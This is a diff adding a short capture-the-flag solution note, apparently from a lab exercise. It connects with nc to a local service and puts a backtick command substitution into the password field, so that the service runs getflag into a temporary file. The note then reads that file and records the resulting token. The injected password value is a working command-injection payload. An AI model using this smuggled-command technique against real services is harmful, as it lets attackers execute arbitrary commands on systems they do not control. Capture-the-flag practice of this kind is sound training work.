@@ -1,0 +1,4 @@
+nc 127.0.0.1 5151
+Password: \"`getflag >/tmp/garbage`\"
+cat garbage
+token : fa6v5ateaw21peobuub8ipe6s
